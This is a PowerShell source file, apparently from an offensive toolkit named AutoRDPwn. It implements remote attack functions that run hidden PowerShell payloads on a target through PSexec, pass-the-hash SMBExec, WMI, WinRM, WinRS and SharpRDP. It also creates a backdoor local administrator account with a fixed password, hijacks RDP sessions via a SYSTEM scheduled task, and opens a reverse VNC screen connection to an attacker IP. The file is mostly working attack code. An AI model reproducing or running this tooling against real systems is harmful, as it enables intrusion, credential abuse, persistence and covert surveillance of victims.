function Get-ARAttackPayloadCommand {
    param([Parameter(Mandatory = $true)][string]$Payload)
    $escaped = $Payload -replace '"', '\"'
    return 'powershell.exe -windowstyle hidden -Command "' + $escaped + '"'
}

function Invoke-ARAttackPSexec {
    $target = Get-ARTargetComputer
    Import-ARToolScript 'Resources\Scripts\Invoke-PSexec.ps1'
    $executable = Join-Path $script:ARTools 'psexec.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'PSexec could not be extracted.' }
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    foreach ($payload in @(Get-ARPayloads)) {
        $arguments = @("\\$target")
        if ($user -ne '') { $arguments += @('-u', $user, '-p', $password) }
        $arguments += @('-h', '-d', 'powershell.exe', '-windowstyle', 'hidden', $payload, '-nobanner', '-accepteula')
        & $executable @arguments 2>&1 | ForEach-Object { Write-Host $_ }
    }
    Set-ARStatus 'Payloads started with PSexec' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackPassTheHash {
    $target = Get-ARTargetComputer
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['User'])) {
        $script:ARTarget['User'] = Read-ARValue 'User'
    }
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['Hash'])) {
        $script:ARTarget['Hash'] = Read-ARValue 'NTLM hash'
    }
    $user = [string]$script:ARTarget['User']
    $hash = [string]$script:ARTarget['Hash']
    $domain = [string]$script:ARTarget['Domain']
    Import-ARFunctionScript 'Resources\Scripts\Invoke-SMBExec.ps1'
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $command 2>&1 | ForEach-Object { Write-Host $_ }
    }
    $createUser = Get-ARText 'Pwn5' ''
    if ($createUser -ne '') {
        Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createUser 2>&1 | ForEach-Object { Write-Host $_ }
    }
    $hashUser = 'ARDP_' + [guid]::NewGuid().ToString('N').Substring(0, 8)
    $createHashUser = 'net user ' + $hashUser + ' AutoRDPwn /add & net localgroup Administrators ' + $hashUser + ' /add'
    Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createHashUser 2>&1 | ForEach-Object { Write-Host $_ }
    $script:ARHashUserName = $hashUser
    $secure = ConvertTo-SecureString -String 'AutoRDPwn' -AsPlainText -Force
    $script:AROverrideCredential = New-Object System.Management.Automation.PSCredential($hashUser, $secure)
    Start-Sleep -Seconds 2
    try {
        Connect-ARTargetSession -Force | Out-Null
        Invoke-ARShadowEngine | Out-Null
    }
    finally {
        $script:AROverrideCredential = $null
    }
}

function Invoke-ARAttackWmi {
    $target = Get-ARTargetComputer
    $credential = Get-ARTargetCredential
    $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
    if ($credential) { $parameters['Credential'] = $credential }
    $cimSession = New-CimSession @parameters
    try {
        foreach ($payload in @(Get-ARPayloads)) {
            $command = Get-ARAttackPayloadCommand $payload
            $result = Invoke-CimMethod -CimSession $cimSession -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $command } -ErrorAction Stop
            if ($result.ReturnValue -ne 0) {
                Write-ARWarn ('WMI process creation returned ' + $result.ReturnValue)
            }
        }
    }
    finally { Remove-CimSession -CimSession $cimSession -ErrorAction SilentlyContinue }
    Set-ARStatus 'Payloads started with WMI' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackWinRm {
    $target = Get-ARTargetComputer
    $credential = Get-ARTargetCredential
    foreach ($payload in @(Get-ARPayloads)) {
        $parameters = @{
            ComputerName = $target
            ScriptBlock = { param($command) & powershell.exe -WindowStyle Hidden -Command $command }
            ArgumentList = @($payload)
            ErrorAction = 'Stop'
        }
        if ($credential) {
            $parameters['Credential'] = $credential
            $parameters['Authentication'] = 'Negotiate'
        }
        Invoke-Command @parameters | Out-Null
    }
    Set-ARStatus 'Payloads started with WinRM' 'Ok'
    Connect-ARTargetSession -Force | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackWinRs {
    $target = Get-ARTargetComputer
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        $arguments = @("/r:$target")
        if ($user -ne '') { $arguments += @("/u:$user", "/p:$password") }
        $arguments += @('/noecho', '/noprofile', '/allowdelegate', $command)
        & winrs.exe @arguments 2>&1 | ForEach-Object { Write-Host $_ }
        Start-Sleep -Milliseconds 600
    }
    Set-ARStatus 'Payloads started with WinRS' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackTscon {
    if (-not (Test-ARIsAdmin)) { throw 'Administrator privileges are required for TSCon.' }
    $query = & query.exe session 2>&1
    Show-ARText $query
    $sessionId = Get-ARSessionId $query 1
    if (-not $script:ARInvokedFromOption) {
        $answer = Read-ARValue 'Session ID' ([string]$sessionId)
        if ($answer -match '^\d+$') { $sessionId = [int]$answer }
    }
    $taskName = 'AutoRDPwnTscon' + [guid]::NewGuid().ToString('N').Substring(0, 8)
    $action = New-ScheduledTaskAction -Execute (Join-Path $env:SystemRoot 'System32\tscon.exe') -Argument ([string]$sessionId)
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    try {
        Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
        Start-Sleep -Seconds 2
    }
    finally {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }
    Set-ARStatus ('Session ' + $sessionId + ' hijacked') 'Ok'
}

function Invoke-ARAttackRdp {
    $target = Get-ARTargetComputer
    Import-ARToolScript 'Resources\Scripts\Invoke-SharpRDP.ps1'
    $executable = Join-Path $script:ARTools 'SharpRDP.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'SharpRDP could not be extracted.' }
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        $arguments = @("computername=$target")
        if ($user -ne '') { $arguments += @("username=$user", "password=$password") }
        $arguments += "command=$command"
        & $executable @arguments 2>&1 | ForEach-Object { Write-Host $_ }
    }
    Set-ARStatus 'Payloads started with SharpRDP' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackQuickScreen {
    $target = Get-ARTargetComputer
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['User'])) {
        if ($script:ARInvokedFromOption) { throw 'Quick Screen requires a target user.' }
        $script:ARTarget['User'] = Read-ARValue 'Target user' $env:USERNAME
    }
    $password = Get-ARPlainPassword
    $attacker = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($attacker)) {
        if ($script:ARInvokedFromOption) { throw 'Quick Screen requires the attacker IP.' }
        $attacker = Read-ARValue (Get-ARText 'txt123' 'Your IP for the reverse connection')
    }
    $viewOnly = ([string]$script:ARTarget['Mode'] -eq 'view')
    $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCViewer.ps1'
    $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCServer.ps1'
    Import-ARFunctionScript 'Resources\Scripts\Invoke-StealthScreen.ps1'
    Invoke-StealthScreen -Target $target -User ([string]$script:ARTarget['User']) -Pass $password -Mode view -AttackerIP $attacker -Port 5500 -ViewOnly:$viewOnly
    Set-ARStatus 'Quick Screen finished' 'Ok'
}
